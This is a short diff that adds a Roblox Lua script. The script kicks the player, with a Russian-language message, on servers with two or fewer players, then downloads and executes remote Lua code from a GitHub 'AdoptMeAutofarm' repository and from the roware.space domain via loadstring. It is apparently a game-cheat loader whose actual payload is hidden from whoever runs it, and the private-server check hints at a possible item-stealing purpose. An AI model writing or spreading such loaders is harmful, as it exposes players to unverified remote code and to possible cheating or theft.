@@ -1,0 +1,5 @@
+if #game:GetService("Players"):GetPlayers() <= 2 then
+    game.Players.LocalPlayer:Kick("Данный скрипт не работает на ВИП сервере! Прошу перезаййти на ПУБЛИЧНЫЙ сервер!")
+end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/boygamer1/AdoptMeAutofarm/refs/heads/main/MainGui", true))()
+loadstring(game:HttpGet("https://roware.space/bada3439f18776eb16c3d089.lua", true))()
